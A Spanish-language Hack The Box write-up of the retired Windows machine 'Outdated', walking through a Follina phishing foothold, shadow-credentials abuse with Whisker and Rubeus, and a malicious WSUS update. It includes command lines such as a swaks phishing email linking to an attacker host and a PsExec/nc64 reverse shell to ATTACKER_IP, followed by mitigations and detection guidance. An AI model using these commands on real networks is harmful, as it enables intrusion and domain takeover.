---
machine: Outdated
os: Windows
difficulty: Medium
platform: Hack The Box
category: Machines
state: Retired
tags: [windows, active-directory, follina, shadow-credentials, wsus]
---

# Outdated — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired, ficha publicable.
> Ficha de referencia basada en documentación pública y writeups técnicos. Sin flags ni credenciales reales.

## TL;DR

Un share SMB anónimo contiene un PDF con la dirección de soporte y pistas del entorno. Se envía un correo con un enlace a un payload **Follina (CVE-2022-30190)**; el cliente lo abre con Word y `ms-msdt` ejecuta código. La shell obtenida permite enumerar AD y abusar de **shadow credentials** sobre `sflowers`: se añade una clave a `msDS-KeyCredentialLink`, se pide un TGT con el certificado y se obtiene el hash para WinRM. Como `sflowers` está en `WSUS Administrators`, se publica una actualización maliciosa con SharpWSUS y se ejecuta PsExec en el DC como SYSTEM.

## Reconocimiento

```bash
nmap -p- --min-rate 10000 -sV -sC <IP> -oN nmap.txt
```

```text
25/tcp    smtp       hMailServer
53/tcp    domain
88/tcp    kerberos-sec
135/tcp   msrpc
139/tcp   netbios-ssn
143/tcp   imap
389/tcp   ldap
445/tcp   microsoft-ds
464/tcp   kpasswd5
587/tcp   submission
593/tcp   http-rpc-epmap
636/tcp   ldapssl
2179/tcp  vmrdp
3268/tcp  globalcatLDAP
3269/tcp  globalcatLDAPssl
5985/tcp  wsman
8530/tcp  WSUS (HTTP)
8531/tcp  WSUS (HTTPS)
9389/tcp  adws
```

Dominio `outdated.htb`, DC `dc.outdated.htb`, correo `mail.outdated.htb`. Los puertos 8530/8531 confirman WSUS.

## Enumeración

```bash
smbclient -L //<IP> -N
smbclient -N //<IP>/Shares
```

`Shares` es legible de forma anónima y contiene `NOC_Reminder.pdf`. El documento menciona el correo de soporte y el flujo de actualizaciones. También se enumeran usuarios y grupos por LDAP/SMB.

## Foothold

Se genera un HTML que invoca el protocolo `ms-msdt` con un comando codificado y se sirve por HTTP. El payload debe superar los 4096 bytes para evitar la comprobación de actividad del usuario.

```bash
python3 follina.py --serve 80 --payload '<BASE64_COMMAND>'
```

Se envía el enlace al buzón de soporte con `swaks`:

```bash
swaks --to itsupport@outdated.htb --from 'tester@outdated.htb' \
  --header 'Subject: Internal web app' --body 'http://<ATTACKER_IP>/msdt.html'
```

Cuando el usuario abre el enlace, Word inicia `msdt.exe` y ejecuta el comando. Se recibe una shell como `btables` en el equipo cliente.

## Movimiento lateral

Con la shell se recopila BloodHound y se identifica que `btables` puede escribir `msDS-KeyCredentialLink` sobre `sflowers` (shadow credentials). Se añade una clave pública al objeto:

```powershell
.\Whisker.exe add /target:sflowers /domain:outdated.htb /dc:DC.outdated.htb
```

La salida incluye un certificado y una contraseña. Con Rubeus se solicita un TGT para `sflowers`:

```powershell
.\Rubeus.exe asktgt /user:sflowers /certificate:<BASE64_PFX> /password:<PASSWORD> /nowrap
```

El ticket permite autenticarse y extraer el hash NTLM de la cuenta. Con `evil-winrm -H <NTLM_HASH>` se obtiene una sesión como `sflowers`.

## Escalada de privilegios

`sflowers` pertenece a `WSUS Administrators`. El registro confirma que el cliente usa `http://wsus.outdated.htb:8530`. Se sube SharpWSUS y se enumera el servidor:

```powershell
.\SharpWSUS.exe locate
.\SharpWSUS.exe inspect
```

WSUS solo distribuye binarios firmados por Microsoft, así que se usa `PsExec.exe` de Sysinternals como payload firmado. Se crea una actualización que ejecuta PsExec con `nc64.exe` como SYSTEM:

```powershell
.\SharpWSUS.exe create /payload:'C:\ProgramData\PsExec.exe' \
  /args:'-accepteula -s -d C:\ProgramData\nc64.exe -e cmd.exe <ATTACKER_IP> 445' \
  /title:'CVE-2022-30190'
```

Se aprueba la actualización para el DC y se fuerza la comprobación. El DC descarga el binario, lo ejecuta como SYSTEM y devuelve una shell.

## Evidencia

- Correo enviado y petición HTTP del payload Follina.
- `whoami` como `btables`, `sflowers` y `nt authority\system`.
- `SharpWSUS inspect` y el identificador de la actualización, sin credenciales.
- Captura de la shell entrante en el listener.

## Lecciones aprendidas

- Follina no necesita macros: un enlace y `ms-msdt` bastan si el usuario abre el documento.
- Shadow credentials permite moverse sin conocer la contraseña, solo con permiso de escritura sobre el atributo.
- WSUS es una cadena de suministro interna: quien aprueba actualizaciones puede ejecutar código en todos los clientes.
- La combinación de un permiso AD aparentemente menor y un servicio de despliegue lleva a Domain Admin.

## Mitigaciones y detección

- **Corrección:** parchear CVE-2022-30190; bloquear `ms-msdt` desde Office; aplicar el principio de menor privilegio sobre `msDS-KeyCredentialLink`; separar `WSUS Administrators` de cuentas de usuario; firmar y validar las actualizaciones; limitar la publicación local.
- **Detección:** procesos `msdt.exe` lanzados por Office con argumentos `/id PCWDiagnostic`; conexiones HTTP a dominios externos desde Word; eventos 5136 al modificar `msDS-KeyCredentialLink`; 4768 con certificado; creación de actualizaciones WSUS y ejecución de `PsExec` desde `C:\ProgramData`.
- MITRE ATT&CK: T1204.002 (malicious file), T1556 (modify authentication process), T1550.002 (pass the hash), T1072 (software deployment tools).

## Referencias

- <https://www.hackthebox.com/machines/Outdated>
- <https://0xdf.gitlab.io/2022/12/10/htb-outdated.html>
- <https://nvd.nist.gov/vuln/detail/CVE-2022-30190>
- <https://github.com/Th3M3/SharpWSUS>
